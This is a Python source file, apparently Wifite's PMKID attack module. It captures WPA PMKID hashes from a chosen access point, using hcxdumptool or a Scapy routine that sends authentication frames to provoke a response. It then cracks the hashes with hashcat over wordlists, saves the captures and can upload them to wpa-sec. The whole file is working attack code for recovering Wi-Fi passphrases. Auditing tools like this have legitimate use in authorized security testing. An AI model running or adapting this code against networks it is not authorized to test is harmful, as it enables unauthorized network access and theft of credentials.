#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapngTool, Hashcat, HashcatCracker
from ..util.color import Color
from ..util.timer import Timer
from ..util.output import OutputManager
from ..model.pmkid_result import CrackResultPMKID
from ..tools.airodump import Airodump
from ..util.wpasec_uploader import WpaSecUploader
from ..util.logger import log_debug, log_info, log_warning, log_error, mask_sensitive
from threading import Thread, active_count
import os
import time
import re
import glob
from shutil import copy

# Check for native PMKID availability
try:
    from ..native.pmkid import ScapyPMKID
    NATIVE_PMKID_AVAILABLE = ScapyPMKID.is_available()
except BaseException:
    NATIVE_PMKID_AVAILABLE = False


class AttackPMKID(Attack):
    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.do_airCRACK = False
        self.keep_capturing = None
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.success = False
        self.timer = None

        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import PMKIDAttackView
                self.view = PMKIDAttackView(OutputManager.get_controller(), target)
            except Exception:
                # If TUI initialization fails, continue without it
                self.view = None

    @staticmethod
    def get_existing_pmkid_file(bssid):
        """
        Returns existing PMKID hash file for the given BSSID.
        Returns None if no PMKID hash file exists for the given BSSID.
        """
        if not os.path.exists(Configuration.wpa_handshake_dir):
            log_debug('AttackPMKID', f'Handshake directory does not exist: {Configuration.wpa_handshake_dir}')
            return None

        bssid = bssid.lower().replace(':', '')
        log_info('AttackPMKID', f'Searching for existing PMKID file for BSSID: {bssid}')

        if Configuration.verbose > 1:
            Color.pl('{+} {D}Looking for existing PMKID for BSSID: {C}%s{W}' % bssid)

        # Use glob pattern for better file matching
        pmkid_pattern = os.path.join(Configuration.wpa_handshake_dir, 'pmkid_*.22000')
        files_found = glob.glob(pmkid_pattern)
        log_debug('AttackPMKID', f'Found {len(files_found)} PMKID file(s) to check')

        for pmkid_filename in files_found:
            if not os.path.isfile(pmkid_filename):
                continue

            try:
                log_debug('AttackPMKID', f'Checking file: {os.path.basename(pmkid_filename)}')
                with open(pmkid_filename, 'r') as pmkid_handle:
                    pmkid_hash = pmkid_handle.read().strip()

                    if Configuration.verbose > 2:
                        Color.pl('{+} {D}Checking file {C}%s{W}: {C}%s{W}' % (os.path.basename(pmkid_filename), pmkid_hash[:50] + '...'))

                    # Validate hash format before parsing
                    if not pmkid_hash or not pmkid_hash.startswith('WPA*'):
                        log_debug('AttackPMKID', f'SKIP: Invalid hash format in {os.path.basename(pmkid_filename)}')
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Invalid hash format in {C}%s{W}' % os.path.basename(pmkid_filename))
                        continue

                    # Split hash and validate sufficient fields
                    # Format: WPA*type*hash*bssid*station*essid = 6 fields minimum
                    hash_fields = pmkid_hash.split('*')
                    if len(hash_fields) < 6:
                        log_debug('AttackPMKID', f'SKIP: Insufficient fields in {os.path.basename(pmkid_filename)} (got {len(hash_fields)}, need 6)')
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Insufficient fields in {C}%s{W} (got %d, need 6)' % (os.path.basename(pmkid_filename), len(hash_fields)))
                        continue

                    # Extract BSSID from correct field (index 3, not 1)
                    existing_bssid = hash_fields[3].lower().replace(':', '')

                    # Validate extracted BSSID format
                    if len(existing_bssid) != 12 or not all(c in '0123456789abcdef' for c in existing_bssid):
                        log_debug('AttackPMKID', f'SKIP: Invalid BSSID format in {os.path.basename(pmkid_filename)}: {existing_bssid}')
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Invalid BSSID format in {C}%s{W}: {C}%s{W}' % (os.path.basename(pmkid_filename), existing_bssid))
                        continue

                    log_debug('AttackPMKID', f'Comparing BSSID: {existing_bssid} vs target: {bssid}')
                    if Configuration.verbose > 2:
                        Color.pl('{+} {D}Extracted BSSID: {C}%s{W} vs target: {C}%s{W}' % (existing_bssid, bssid))

                    if existing_bssid == bssid:
                        log_info('AttackPMKID', f'Found matching PMKID file: {os.path.basename(pmkid_filename)}')
                        if Configuration.verbose > 1:
                            Color.pl('{+} {G}Found matching PMKID file: {C}%s{W}' % os.path.basename(pmkid_filename))
                        return pmkid_filename

            except (IOError, OSError) as e:
                log_warning('AttackPMKID', f'Error reading {os.path.basename(pmkid_filename)}: {str(e)}')
                if Configuration.verbose > 2:
                    Color.pl('{+} {R}ERROR reading {C}%s{W}: %s' % (os.path.basename(pmkid_filename), str(e)))
                continue

        log_info('AttackPMKID', f'No existing PMKID found for BSSID: {bssid}')
        if Configuration.verbose > 1:
            Color.pl('{+} {D}No existing PMKID found for BSSID: {C}%s{W}' % bssid)
        return None

    def run_hashcat(self):
        """
        Performs PMKID attack, if possible.
            1) Captures PMKID hash (or re-uses existing hash if found).
            2) Cracks the hash.

        Returns:
            True if handshake is captured. False otherwise.
        """

        # Skip if user doesn't want to run PMKID attack
        if Configuration.dont_use_pmkid:
            self.success = False
            return False

        from ..util.process import Process

        # Check tool availability - prioritize hcxdumptool, fallback to native
        use_native_pmkid = False
        dependencies = [
            HcxDumpTool.dependency_name,
            HcxPcapngTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]

        if missing_deps:
            # Check if native PMKID capture is available as fallback
            if NATIVE_PMKID_AVAILABLE:
                log_info('AttackPMKID', f'Missing tools ({missing_deps}), using native PMKID capture')
                Color.pl('{+} {O}Missing tools: {R}%s{W}' % ', '.join(missing_deps))
                Color.pl('{+} {G}Using native PMKID capture (Scapy){W}')
                if self.view:
                    self.view.add_log('Using native PMKID capture (hcxdumptool not found)')
                use_native_pmkid = True
            else:
                Color.pl('{!} Skipping PMKID attack, missing required tools: {O}%s{W}' % ', '.join(missing_deps))
                Color.pl('{!} {O}Native fallback not available (Scapy not installed){W}')
                return False

        pmkid_file = None

        if not Configuration.ignore_old_handshakes:
            # Load existing PMKID hash from filesystem
            if Configuration.verbose > 1:
                Color.pl('{+} {D}Checking for existing PMKID for BSSID: {C}%s{W}' % self.target.bssid)
            if self.view:
                self.view.add_log("Checking for existing PMKID hash...")

            pmkid_file = AttackPMKID.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                if self.view:
                    self.view.add_log(f"Found existing PMKID: {os.path.basename(pmkid_file)}")
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              'Using {C}existing{W} PMKID hash: {C}%s{W}' % os.path.basename(pmkid_file))
            elif Configuration.verbose > 1:
                if self.view:
                    self.view.add_log("No existing PMKID found, will capture new one")
                Color.pl('{+} {D}No existing PMKID found, will capture new one{W}')

        if pmkid_file is None:
            # Capture hash from live target - use native or hcxdumptool
            if use_native_pmkid:
                pmkid_file = self.capture_pmkid_native()
            else:
                pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            if self.view:
                self.view.add_log("Failed to capture PMKID")
            return False  # No hash found.

        # Log that we have a PMKID and will proceed to crack
        if self.view:
            self.view.add_log(f"PMKID hash ready: {os.path.basename(pmkid_file)}")
            self.view.add_log("Proceeding to crack phase...")

        # Upload to wpa-sec if configured
        # Note: wpa-sec only accepts pcap/pcapng files, not .22000 hash files
        # Upload the original pcapng capture file instead of the hash file
        if WpaSecUploader.should_upload():
            if self.view:
                self.view.add_log("Checking wpa-sec upload configuration...")

            # Use the pcapng file if it exists, otherwise skip upload
            # Note: If only .22000 hash file exists, that's fine - wpa-sec doesn't accept hash files anyway
            if os.path.exists(self.pcapng_file):
                WpaSecUploader.upload_capture(
                    self.pcapng_file,
                    self.target.bssid,
                    self.target.essid,
                    capture_type='pmkid',
                    view=self.view
                )
            # Silently skip if pcapng doesn't exist - this is normal when using existing hash files

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            if self.view:
                self.view.add_log("Skipping crack phase (--skip-crack flag)")
            return self._handle_hashcat_failure(
                '\n{+} Not cracking pmkid because {C}skip-crack{W} was used{W}')

        # Crack it.
        if Process.exists(Hashcat.dependency_name):
            try:
                self.success = self.crack_pmkid_file(pmkid_file)
            except KeyboardInterrupt:
                return self._handle_hashcat_failure(
                    '\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}'
                )
        else:
            self.success = False
            if self.view:
                self.view.add_log(f"Cannot crack PMKID: {Hashcat.dependency_name} not found")
            Color.pl('\n {O}[{R}!{O}] Note: PMKID attacks are not possible because you do not have {C}%s{O}.{W}'
                     % Hashcat.dependency_name)

        return self.success  # Only consider attack successful if cracking succeeded

    def _handle_hashcat_failure(self, message):
        Color.pl(message)
        self.success = False
        return False

    def run(self):
        # Start TUI view if available
        if self.view:
            self.view.start()
            self.view.set_attack_type("PMKID Attack")

            # Handle hidden ESSID
            essid_display = self.target.essid if self.target.essid else "<hidden ESSID>"
            self.view.add_log(f"Starting PMKID attack on {essid_display} ({self.target.bssid})")

            # Handle invalid channel
            channel_display = self.target.channel if self.target.channel and str(self.target.channel) != '-1' else "unknown"
            self.view.add_log(f"Channel: {channel_display}")

        if self.do_airCRACK:
            return self.run_aircrack()
        else:
            return self.run_hashcat()

    def run_aircrack(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'PMKID capture', 'Waiting for target to appear...')
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                return None

            # # Try to load existing handshake
            # if Configuration.ignore_old_handshakes == False:
            #     bssid = airodump_target.bssid
            #     essid = airodump_target.essid if airodump_target.essid_known else None
            #     handshake = self.load_handshake(bssid=bssid, essid=essid)
            #     if handshake:
            #         Color.pattack('WPA', self.target, 'Handshake capture',
            #                       'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
            #         Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
            #         return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)

            while not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}{W}, deauth:{O}{W}, timeout:{R}%s{W})' % timeout_timer)

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                # bssid = airodump_target.bssid
                # essid = airodump_target.essid if airodump_target.essid_known else None

                # AttackPMKID.check_pmkid(temp_file, self.target.bssid)
                if self.check_pmkid(temp_file):
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA', airodump_target, 'PMKID capture', '{G}Captured PMKID{W}')
                    Color.pl('')
                    capture = temp_file
                    break

                # There is no handshake
                capture = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # # Look for new clients
                # airodump_target = self.wait_for_target(airodump)
                # for client in airodump_target.clients:
                #     if client.station not in self.clients:
                #         Color.clear_entire_line()
                #         Color.pattack('WPA',
                #                 airodump_target,
                #                 'Handshake capture',
                #                 'Discovered new client: {G}%s{W}' % client.station)
                #         Color.pl('')
                #         self.clients.append(client.station)

                # # Send deauth to a client or broadcast
                # if deauth_timer.ended():
                #     self.deauth(airodump_target)
                #     # Restart timer
                #     deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                # continue # Handshake listen+deauth loop

        if capture is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
            self.success = False
        else:
            # Save copy of handshake to ./hs/
            self.success = False
            self.save_pmkid(capture)

        return self.success

    def check_pmkid(self, filename):
        """Returns tuple (BSSID,None) if aircrack thinks self.capfile contains a handshake / can be cracked"""

        from ..util.process import Process

        command = f'aircrack-ng  "{filename}"'
        (stdout, stderr) = Process.call(command)

        return any('with PMKID' in line and self.target.bssid in line for line in stdout.split("\n"))

    def capture_pmkid(self):
        """
        Runs hashcat's hcxpcapngtool to extract PMKID hash from the .pcapng file.
        Returns:
            The PMKID hash (str) if found, otherwise None.
        """
        log_info('AttackPMKID', f'Starting PMKID capture for {self.target.essid} ({self.target.bssid})')
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Check file descriptor usage and thread count before starting
        from ..util.process import Process
        if Process.check_fd_limit() or active_count() > 20:  # Limit concurrent threads
            log_warning('AttackPMKID', f'Delaying PMKID attack due to high resource usage (threads: {active_count()})')
            Color.pl('{!} {O}Delaying PMKID attack due to high resource usage{W}')
            time.sleep(2)  # Brief delay to allow cleanup

        # Update TUI view if available
        if self.view:
            self.view.add_log("Starting PMKID capture with hcxdumptool...")
            self.view.set_capture_tool("hcxdumptool")

        # Start hcxdumptool
        log_debug('AttackPMKID', 'Starting hcxdumptool thread')
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapngTool(self.target)
        attempts = 0
        invalid_hash_count = 0
        max_invalid_retries = 5  # Max consecutive invalid hashes before giving up
        log_debug('AttackPMKID', f'Starting PMKID capture loop (timeout: {Configuration.pmkid_timeout}s)')
        while self.timer.remaining() > 0:
            attempts += 1
            log_debug('AttackPMKID', f'PMKID capture attempt {attempts}')
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                # Validate hash format: WPA*type*hash*bssid*station*essid
                pmkid_hash = pmkid_hash.strip()
                if not pmkid_hash.startswith('WPA*') or pmkid_hash.count('*') < 5:
                    invalid_hash_count += 1
                    log_warning('AttackPMKID',
                                f'Invalid PMKID hash format (invalid {invalid_hash_count}/{max_invalid_retries}, '
                                f'attempt {attempts}): {pmkid_hash[:40]}...')
                    if self.view:
                        self.view.add_log(f'Invalid hash format ({invalid_hash_count}/{max_invalid_retries})')

                    if invalid_hash_count >= max_invalid_retries:
                        log_error('AttackPMKID',
                                  f'Too many invalid PMKID hashes ({invalid_hash_count}), aborting capture')
                        Color.pl('\n{!} {R}Too many invalid PMKID hashes, aborting{W}')
                        pmkid_hash = None
                        break

                    pmkid_hash = None
                    # Brief backoff before retry to let pcapng accumulate more data
                    time.sleep(min(2 * invalid_hash_count, 5))
                    continue

                # Valid hash - reset invalid counter and break
                invalid_hash_count = 0
                log_info('AttackPMKID', f'PMKID captured successfully after {attempts} attempt(s)')
                break  # Got PMKID

            # Update TUI view
            if self.view:
                elapsed = Configuration.pmkid_timeout - self.timer.remaining()
                self.view.update_pmkid_status(False, attempts)
                self.view.add_log(f"Waiting for PMKID... ({int(elapsed)}s / {Configuration.pmkid_timeout}s)")

            Color.pattack('PMKID', self.target, 'CAPTURE', 'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        self.keep_capturing = False
        # Wait for dump tool thread to finish cleanup
        try:
            t.join(timeout=5)
        except Exception:
            pass

        if pmkid_hash is None:
            log_warning('AttackPMKID', f'PMKID capture failed: timeout after {attempts} attempt(s)')
            if self.view:
                self.view.update_pmkid_status(False, attempts)
                self.view.add_log("Failed to capture PMKID - timeout reached")
            Color.pattack('PMKID', self.target, 'CAPTURE', '{R}Failed{O} to capture PMKID\n')
            Color.pl('')
            return None  # No hash found.

        # Success!
        log_info('AttackPMKID', 'PMKID capture successful, saving to file')
        if self.view:
            self.view.update_pmkid_status(True, attempts)
            self.view.add_log("Successfully captured PMKID!")

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        return self.save_pmkid(pmkid_hash)

    def crack_pmkid_file(self, pmkid_file):
        """
        Runs hashcat containing PMKID hash (*.22000).
        If cracked, saves results in self.crack_result
        Returns:
            True if cracked, False otherwise.
        """
        log_info('AttackPMKID', f'Starting PMKID crack for {self.target.essid} ({self.target.bssid})')
        log_debug('AttackPMKID', f'PMKID file: {pmkid_file}')

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            log_warning('AttackPMKID', 'PMKID crack skipped: no wordlist specified')
            if self.view:
                self.view.add_log("No wordlist specified - skipping crack")
            Color.pl('\n{!} {O}Not cracking PMKID because there is no {R}wordlist{O} (re-run with {C}--dict{O})')

            Color.pl('{!} {O}Run Wifite with the {R}--crack{O} and {R}--dict{O} options to try again.')

            key = None
        else:
            wordlists_to_try = [wl for wl in Configuration.wordlists if os.path.exists(wl)]
            if not wordlists_to_try:
                wordlists_to_try = [Configuration.wordlist]

            log_info('AttackPMKID', f'Using {len(wordlists_to_try)} wordlist(s)')
            if self.view:
                self.view.set_attack_type("PMKID Crack")
                self.view.add_log(f"Starting PMKID crack with {len(wordlists_to_try)} wordlist(s)")
                self.view.add_log("Running hashcat...")

            key = None
            for wordlist in wordlists_to_try:
                wordlist_name = os.path.basename(wordlist)
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID using {C}%s{W} ...\n' % wordlist_name)

                try:
                    with HashcatCracker(pmkid_file, wordlist) as cracker:
                        cracker.start(show_command=Configuration.verbose > 1)

                        # Polling loop for progress tracking
                        while not cracker.is_finished():
                            status = cracker.poll_status()
                            if self.view:
                                self.view.update_progress({
                                    'progress': status['progress'],
                                    'metrics': {
                                        'Speed': status['speed'],
                                        'ETA': status['eta']
                                    }
                                })

                            # Update TUI status line periodically (approx every 2 seconds)
                            # We use a simple sleep since this is a dedicated attack thread
                            time.sleep(2)

                        key = cracker.get_result()
                except KeyboardInterrupt:
                    return self._handle_hashcat_failure(
                        '\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}'
                    )
                except Exception as e:
                    log_error('AttackPMKID', f'Error during hashcat polling: {e}')
                    continue

                if key is not None:
                    break
                Color.pl('{!} {O}%s did not contain password{W}' % wordlist_name)

        if key is not None:
            log_info('AttackPMKID', f'PMKID cracked successfully! Password: {mask_sensitive(key)}')
            return self._handle_pmkid_crack_success(key, pmkid_file)
        # Failed to crack.
        if Configuration.wordlist is not None:
            log_warning('AttackPMKID', 'PMKID crack failed: passphrase not found in wordlist')
            if self.view:
                self.view.add_log("Failed to crack PMKID - passphrase not in wordlist")
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, '{R}CRACK',
                          '{R}Failed {O}Passphrase not found in dictionary.\n')
        return False

    def _handle_pmkid_crack_success(self, key, pmkid_file):
        # Successfully cracked.
        if self.view:
            self.view.add_log("Successfully cracked PMKID!")
            self.view.add_log(f"Password: {mask_sensitive(key)}")
            self.view.update_progress({
                'progress': 1.0,
                'status': 'PMKID cracked successfully!',
                'metrics': {
                    'Password': key,
                    'Status': 'SUCCESS'
                }
            })

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACKED', '{C}Key: {G}%s{W}' % key)
        self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                                             pmkid_file, key)
        Color.pl('\n')
        self.crack_result.dump()
        return True

    def dumptool_thread(self):
        """Runs hashcat's hcxdumptool until it dies or `keep_capturing == False`"""
        try:
            with HcxDumpTool(self.target, self.pcapng_file) as dumptool:
                # Let the dump tool run until we have the hash.
                while self.keep_capturing and dumptool.poll() is None:
                    time.sleep(0.5)
        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl(f'\n{{!}} {{R}}HcxDumpTool error{{W}}: {str(e)}')
        # Context manager will handle cleanup automatically

    def capture_pmkid_native(self):
        """
        Capture PMKID using native Scapy implementation.

        This is a fallback method when hcxdumptool is not available.
        Uses ScapyPMKID to capture PMKID by sending auth frames and
        listening for EAPOL Message 1 responses.

        Returns:
            Path to PMKID hash file (.22000) if captured, None otherwise
        """
        log_info('AttackPMKID', f'Starting native PMKID capture for {self.target.essid} ({self.target.bssid})')

        if self.view:
            self.view.add_log("Starting native PMKID capture (Scapy)...")
            self.view.set_capture_tool("Native (Scapy)")

        Color.pattack('PMKID', self.target, 'CAPTURE', 'Starting native capture...')

        try:
            # Set interface to target channel
            from ..native.interface import NativeInterface
            if self.target.channel:
                try:
                    NativeInterface.set_channel(Configuration.interface, int(self.target.channel))
                    log_debug('AttackPMKID', f'Set channel to {self.target.channel}')
                except Exception as e:
                    log_warning('AttackPMKID', f'Could not set channel: {e}')

            # Capture PMKID with timeout
            timeout = Configuration.pmkid_timeout
            self.timer = Timer(timeout)

            # Track progress for TUI
            def on_pmkid_captured(result):
                log_info('AttackPMKID', f'Native capture found PMKID: {result.pmkid[:16]}...')
                if self.view:
                    self.view.add_log('PMKID captured!')

            # Use ScapyPMKID capture
            result = ScapyPMKID.capture(
                interface=Configuration.interface,
                bssid=self.target.bssid,
                essid=self.target.essid if hasattr(self.target, 'essid') else None,
                timeout=timeout,
                send_auth=True,  # Send auth frames to trigger PMKID
                channel=int(self.target.channel) if self.target.channel else None,
                callback=on_pmkid_captured
            )

            if result is None:
                log_warning('AttackPMKID', 'Native PMKID capture failed: no PMKID received')
                if self.view:
                    self.view.update_pmkid_status(False, 1)
                    self.view.add_log("Failed to capture PMKID (native)")
                Color.pattack('PMKID', self.target, 'CAPTURE', '{R}Failed{O} to capture PMKID (native)\n')
                Color.pl('')
                return None

            # Success - convert to hashcat format and save
            log_info('AttackPMKID', 'Native PMKID capture successful')
            if self.view:
                self.view.update_pmkid_status(True, 1)
                self.view.add_log("Successfully captured PMKID (native)!")

            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W} (native)')

            # Generate hashcat 22000 format
            pmkid_hash = result.to_hashcat_22000()

            # Save to file
            return self.save_pmkid(pmkid_hash)

        except Exception as e:
            log_error('AttackPMKID', f'Native PMKID capture error: {e}', e)
            if self.view:
                self.view.add_log(f"Error during native capture: {str(e)}")
            Color.pl(f'\n{{!}} {{R}}Native PMKID capture error{{W}}: {str(e)}')
            if Configuration.verbose > 1:
                import traceback
                traceback.print_exc()
            return None

    def save_pmkid(self, pmkid_hash):
        """Saves a copy of the pmkid (handshake) to hs/ directory."""
        # Create handshake dir
        if self.do_airCRACK:
            return self._copy_pmkid_to_file(pmkid_hash)
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        pmkid_file = self._generate_pmkid_filepath('.22000')
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')

        return pmkid_file

    def _generate_pmkid_filepath(self, extension):
        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub(r'[^a-zA-Z0-9]+', '_', self.target.essid).strip('_') or 'unknown'
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        result = f'pmkid_{essid_safe}_{bssid_safe}_{date}{extension}'
        result = os.path.join(Configuration.wpa_handshake_dir, result)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % result)
        return result

    def _copy_pmkid_to_file(self, pmkid_hash):
        pmkid_file = self._generate_pmkid_filepath('.cap')
        copy(pmkid_hash, pmkid_file)
        return pmkid_file
